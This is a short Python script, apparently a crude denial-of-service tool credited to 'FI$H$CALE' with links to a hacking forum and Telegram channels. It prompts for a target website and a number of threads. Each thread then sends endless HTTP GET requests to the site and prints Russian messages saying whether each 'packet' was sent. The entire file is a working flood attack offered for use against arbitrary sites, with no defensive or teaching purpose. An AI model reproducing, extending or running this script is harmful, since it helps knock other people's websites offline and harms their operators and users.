import threading, requests, os, random
from colorama import Back, Fore, Style

def clear():
    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')

def dos(site):
  while True:
    r = requests.get(site)
    if str(r.status_code) == '200':
      print(Fore.GREEN+'[+] Пакет отправлен!'+Style.RESET_ALL)
    else:
      print(Fore.RED+'[-] Пакет не отправлен!'+Style.RESET_ALL)
  
clear()
print("""DOS BY FI$H$CALE
lolzteam: https://lolzteam.online/fishscale_bomba/
TG 1: https://t.me/bomba1408
TG 2: https://teleg.run/bomba1408
""")

site = str(input('Site: '))
skok = int(input('Сколько потоков? '))

for i in range(1, skok):
  threading.Thread(target=dos, args=(site,)).start()
